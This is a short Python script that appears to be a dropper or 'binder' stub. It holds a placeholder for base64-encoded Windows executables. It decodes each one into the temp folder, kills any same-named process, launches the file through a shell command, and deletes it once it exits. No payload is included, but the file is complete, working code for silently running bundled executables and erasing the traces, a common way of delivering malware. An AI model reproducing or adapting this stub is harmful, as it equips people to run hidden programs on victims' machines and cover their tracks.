from subprocess import Popen
import tempfile
import base64
import psutil
import threading
import os
import time


def kill_process(process_name):
    for process in psutil.process_iter():
        if process.name() == process_name:
            process.kill()


def process_is_running(process_name):
    for process in psutil.process_iter():
        if process.name() == process_name:
            return True
    return False


def remove_on_exit(exe_name):
    global temp_dir

    while process_is_running(exe_name):
        pass

    os.remove(f'{temp_dir}\\{exe_name}')


exes = []

#EXES-BINARY#

i = 0
temp_dir = tempfile.gettempdir()

for i in range(len(exes)):
    file_name = f'{temp_dir}\\f{i}.exe'
    kill_process(f'f{i}.exe')

    with open(file_name, 'wb') as file_:
        file_.write(base64.b64decode(exes[i]))
        Popen(['start', file_name], shell=True)

    time.sleep(5)
    threading.Thread(target=remove_on_exit, args=(f'f{i}.exe',)).start()
